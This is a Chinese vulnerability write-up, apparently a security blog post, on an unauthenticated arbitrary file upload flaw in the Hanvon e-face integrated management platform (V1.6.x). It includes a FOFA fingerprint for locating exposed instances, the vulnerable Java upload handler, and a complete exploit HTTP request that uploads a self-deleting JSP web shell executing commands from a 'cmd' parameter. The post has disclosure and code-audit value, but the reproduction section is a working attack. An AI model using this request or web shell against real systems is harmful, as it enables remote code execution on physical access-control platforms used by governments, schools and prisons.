---
title: "汉王e脸通综合管理平台 resourceUploadFile.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-dgmCommand-resourceUploadFile-rce.html
asset_dir: assets/汉王e脸通综合管理平台-resourceuploadfile.do-任意文件上传漏洞
---

# 汉王e脸通综合管理平台 resourceUploadFile.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/21 18:06
- 765浏览
- [0评论](#comment)
- 36分钟阅读

深入探索

系统平台

服务器

计算机安全

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `resourceUploadFile.do` 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致[远程代码执行](https://mrxn.net/tag/rce)或服务器被控制，严重威胁系统安全。

漏洞修复方案

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

看下 `DgmCommandController` 的关于 `resourceUploadFile.do` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"resourceUploadFile.do"},
        method = {RequestMethod.POST}
    )
    public RequestJson resourceUploadFile(HttpServletRequest request) {
        RequestJson result = new RequestJson();

        try {
            if (!ServletFileUpload.isMultipartContent(request)) {
                result = RequestJson.failuerResult(result, "网络错误！");
                return result;
            }

            String fileName = null;
            String fileType = null;
            MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;
            Map<String, MultipartFile> fileMap = multipartRequest.getFileMap();
            String uploadPath = null;

            for(Map.Entry<String, MultipartFile> entity : fileMap.entrySet()) {
                MultipartFile mf = (MultipartFile)entity.getValue();
                if (!mf.isEmpty()) {
                    String fileId = UUID.randomUUID().toString().replace("-", "");
                    String fileTypeStr = mf.getOriginalFilename();
                    fileName = fileTypeStr.split("\\.")[0];
                    fileType = fileTypeStr.split("\\.")[1];
                    String path = request.getSession().getServletContext().getRealPath("/resource");
                    File tmpFile = new File(path);
                    if (!tmpFile.exists()) {
                        tmpFile.mkdir();
                    }

                    uploadPath = path + "\\" + fileId + "." + fileType;
                    File targetFile = new File(uploadPath);
                    Files.copy(mf.getInputStream(), targetFile.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
                }
            }

            Map<String, Object> map = new HashMap();
            map.put("fileName", fileName);
            map.put("fileType", fileType);
            map.put("path", uploadPath);
            result = RequestJson.successResult(result, map, "上传成功！");
        } catch (Exception e) {
            String msg = getMessage("basics_go_wrong") + e.getLocalizedMessage();
            result = RequestJson.errorResult(result, msg);
            logger.error(msg);
            e.printStackTrace();
        }

        return result;
    }
```

其中文件保存部分涉及的文件名和后缀如下

物流软件安全

```
String fileTypeStr = mf.getOriginalFilename();
fileName = fileTypeStr.split("\\.")[0];
fileType = fileTypeStr.split("\\.")[1];
```

保存文件的文件名和和文件后缀（类型）均有用户控制，全程无过滤和校验，造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

# 漏洞复现

```
POST /manage/dgmCommand/resourceUploadFile.do?recoToken=67mds2pxXQb HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

访问文件执行命令 `/manage/resource/2025-xx-xx/xxxxx.jsp?cmd=whoami`

[![汉王e脸通综合管理平台 resourceUploadFile.do 任意文件上传漏洞](images/img-001-b84802d3e8f0.webp)](https://image.mrxn.net/d6d359b1ef9642aaa8dded509ab0ebfc.webp)

成功得到 `whoami` [命令执行](https://mrxn.net/tag/rce)结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
